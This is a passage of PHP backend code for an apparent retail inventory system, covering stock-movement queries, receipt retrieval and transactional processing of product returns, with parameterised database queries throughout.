        'SELECT oi.id, oi.order_id, oi.product_id, oi.name, oi.price, oi.quantity, oi.subtotal,
                o.username, o.total, o.created_at, o.status,
                r.return_status
         FROM order_items oi
         JOIN orders o ON o.id = oi.order_id
         LEFT JOIN receipts r ON r.order_id = o.id
         ORDER BY o.created_at DESC'
    );
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_stock_movements(array $filters = []): array {
    $db = get_database();
    $sql = 'SELECT * FROM stock_movements WHERE 1=1';
    $params = [];
    
    if (!empty($filters['product_id'])) {
        $sql .= ' AND product_id = :product_id';
        $params[':product_id'] = $filters['product_id'];
    }
    
    if (!empty($filters['movement_type'])) {
        $sql .= ' AND movement_type = :movement_type';
        $params[':movement_type'] = $filters['movement_type'];
    }
    
    if (!empty($filters['reference_type'])) {
        $sql .= ' AND reference_type = :reference_type';
        $params[':reference_type'] = $filters['reference_type'];
    }
    
    if (!empty($filters['start_date'])) {
        $sql .= ' AND created_at >= :start_date';
        $params[':start_date'] = $filters['start_date'];
    }
    
    if (!empty($filters['end_date'])) {
        $sql .= ' AND created_at <= :end_date';
        $params[':end_date'] = $filters['end_date'];
    }
    
    $sql .= ' ORDER BY created_at DESC';
    
    $stmt = $db->prepare($sql);
    $stmt->execute($params);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function print_receipt(int $receiptId): ?string {
    $stmt = get_database()->prepare(
        'SELECT receipt_content FROM receipts WHERE id = :id'
    );
    $stmt->execute([':id' => $receiptId]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    return $result ? $result['receipt_content'] : null;
}

function process_return(int $orderId, int $productId, int $quantity, string $reason, string $processedBy): bool {
    $db = get_database();
    $db->beginTransaction();

    try {
        $stmt = $db->prepare('SELECT quantity FROM products WHERE id = :id');
        $stmt->execute([':id' => $productId]);
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$product) {
            $db->rollBack();
            return false;
        }

        $currentQty = (int) $product['quantity'];
        $newQuantity = $currentQty + $quantity;
        $update = $db->prepare('UPDATE products SET quantity = :quantity WHERE id = :id');
        $update->execute([':quantity' => $newQuantity, ':id' => $productId]);

        record_stock_movement(
            $productId,
            'in',
            $quantity,
            'return',
            $orderId,
            'Return: ' . ($reason ?: 'No reason provided')
        );

        $insertReturn = $db->prepare(
            'INSERT INTO returns (order_id, product_id, quantity, reason, processed_by, created_at) VALUES (:order_id, :product_id, :quantity, :reason, :processed_by, :created_at)'
        );
        $insertReturn->execute([
            ':order_id' => $orderId,
            ':product_id' => $productId,
            ':quantity' => $quantity,
            ':reason' => $reason,
            ':processed_by' => $processedBy,
            ':created_at' => date('c'),
        ]);

        $itemsStmt = $db->prepare('SELECT product_id, quantity FROM order_items WHERE order_id = :order_id');
        $itemsStmt->execute([':order_id' => $orderId]);
        $orderItems = $itemsStmt->fetchAll(PDO::FETCH_ASSOC);

        $returnsStmt = $db->prepare('SELECT product_id, SUM(quantity) as total_returned FROM returns WHERE order_id = :order_id GROUP BY product_id');
        $returnsStmt->execute([':order_id' => $orderId]);
        $returns = $returnsStmt->fetchAll(PDO::FETCH_ASSOC);
        $returnedMap = [];
        foreach ($returns as $r) {
            $returnedMap[$r['product_id']] = (int) $r['total_returned'];
        }

        $allReturned = true;
        foreach ($orderItems as $item) {
            $returnedQty = $returnedMap[$item['product_id']] ?? 0;
            if ($returnedQty < $item['quantity']) {
                $allReturned = false;
                break;
            }
        }

        if ($allReturned) {
            $updateReceipt = $db->prepare('UPDATE receipts SET return_status = "Returned" WHERE order_id = :order_id');
            $updateReceipt->execute([':order_id' => $orderId]);
        }

        $db->commit();
        return true;
    } catch (Exception $e) {
        $db->rollBack();
        return false;
    }
}

function get_returns_for_order(int $orderId): array {
    $stmt = get_database()->prepare(
        'SELECT r.*, p.name as product_name, p.code as product_code
         FROM returns r
         JOIN products p ON p.id = r.product_id
         WHERE r.order_id = :order_id
         ORDER BY r.created_at DESC'
    );
    $stmt->execute([':order_id' => $orderId]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_order_return_summary(int $orderId): array {
    $db = get_database();
    
    $itemsStmt = $db->prepare('SELECT product_id, quantity FROM order_items WHERE order_id = :order_id');
    $itemsStmt->execute([':order_id' => $orderId]);
    $orderItems = $itemsStmt->fetchAll(PDO::FETCH_ASSOC);
    
    $returnsStmt = $db->prepare('SELECT product_id, SUM(quantity) as total_returned FROM returns WHERE order_id = :order_id GROUP BY product_id');
    $returnsStmt->execute([':order_id' => $orderId]);
    $returns = $returnsStmt->fetchAll(PDO::FETCH_ASSOC);
    $returnedMap = [];
    foreach ($returns as $r) {
        $returnedMap[$r['product_id']] = (int) $r['total_returned'];
    }
    
    $totalItems = 0;
    $totalReturned = 0;
    foreach ($orderItems as $item) {
        $totalItems += $item['quantity'];
        $totalReturned += $returnedMap[$item['product_id']] ?? 0;
    }
    
    return [
        'total_items' => $totalItems,
        'total_returned' => $totalReturned,
        'fully_returned' => $totalItems > 0 && $totalReturned >= $totalItems,
    ];
}
